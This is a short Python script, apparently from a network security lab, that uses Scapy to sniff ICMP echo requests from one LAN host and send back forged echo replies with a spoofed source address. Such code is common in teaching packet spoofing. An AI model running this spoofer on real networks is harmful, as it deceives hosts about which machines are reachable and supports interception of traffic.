from scapy.all import *

def print_pkt(pkt):
	print("Original:")
	print("Source IP---------", pkt[IP].src)
	print("Destination IP----", pkt[IP].dst)
	a = IP()
	a.src = pkt[IP].dst
	a.dst = pkt[IP].src
	a.ihl = pkt[IP].ihl
	a.ttl = 15
	b = ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq)
	if pkt.haslayer(Raw):
	    data = pkt[Raw].load
	    spoof = a/b/data
	else:
	    spoof = a/b
	print("Spoofing IP:")
	print("New Source IP---------", a.src)
	print("New Destination IP----", a.dst)
	print("-----------------------------")
	send(spoof,verbose=0)
f = 'icmp and src host 192.168.1.26'
sniff(iface = 'enp0s3', filter= f,prn=print_pkt)
